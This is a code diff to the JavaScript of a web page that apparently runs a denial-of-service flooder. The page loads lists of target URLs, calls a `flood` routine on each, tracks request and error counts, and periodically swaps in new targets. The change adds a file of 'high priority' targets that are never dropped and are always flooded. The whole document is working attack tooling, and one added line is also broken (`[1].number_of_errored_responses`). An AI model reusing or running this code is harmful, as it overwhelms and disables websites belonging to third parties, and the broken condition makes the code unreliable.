@@ -67,11 +67,30 @@
       }
       targets_subset[source[index]] = {
         active: true,
+        high_priority: false,
         number_of_errored_responses: 0,
         number_of_requests: 0
       };
     }
     return targets_subset;
+  }
+
+  async function get_high_priority_targets() {
+    var targets = {};
+    var source = (await (await fetch ("high_priority_targets.txt")).text()).split("\n");
+    for (var target of source) {
+      if (!/https?:\/\//.test(target)) {
+        target = 'https://' + target;
+      }
+      targets[target] = {
+        high_priority: true,
+        active: true,
+        number_of_errored_responses: 0,
+        number_of_requests: 0
+      };
+    }
+    g_hp_targets_qty = source.length;
+    return targets;
   }
 
   var statsEl = document.getElementById('stats');
@@ -87,9 +106,9 @@
           '</tr>' +
         '</thead>' +
         '<tbody>' +
-          Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) =>
+          Object.entries(targets).map(([target, { high_priority, number_of_requests, number_of_errored_responses  }]) =>
             '<tr>' +
-              '<td>' + target + '</td>' +
+              '<td>' + (high_priority ? '<strong>' + target + '</strong>' : target) + '</td>' +
               '<td>' + number_of_requests + '</td>' +
               '<td>' + number_of_errored_responses + '</td>' +
               '<td>' + number_of_errored_responses / number_of_requests + '</td>' +
@@ -156,24 +175,29 @@
   async function refresh_targets() {
     targets_list = Object.entries(targets);
     for (target of targets_list) {
-      if (target[1].number_of_errored_responses / target[1].number_of_requests > 0.9) {
+      if (!target[1].high_priority && [1].number_of_errored_responses / target[1].number_of_requests > 0.9) {
         targets[target[0]].active = false;
       }
     }
-    var to_replace = g_targets_qty - targets_list.filter(e => e[1].active).length;
+    var to_replace = g_targets_qty + g_hp_targets_qty - targets_list.filter(e => e[1].active).length;
     var new_targets = await get_targets(to_replace);
     targets = {...targets, ...new_targets};
     Object.keys(new_targets).map(flood);
   }
 
   // Start
-  var g_targets_qty = 200;
+  var g_targets_qty = 2;
+  var g_hp_targets_qty = 0;
   document.getElementById('refreshed').innerHTML = Date();
   setInterval(() => {location.reload();}, 3600 * 1000);
   setInterval(refresh_targets, 300 * 1000);
-  var promise = get_targets(g_targets_qty);
-  promise.then(result => { 
-    targets = result; 
-    Object.keys(targets).map(flood) 
+  var hpt_promise = get_high_priority_targets();
+  var t_promise = get_targets(g_targets_qty);
+  hpt_promise.then(result => {
+    targets = result;
+    t_promise.then(result => { 
+      targets = {...targets, ...result}; 
+      Object.keys(targets).map(flood) 
+    });
   });
 </script>
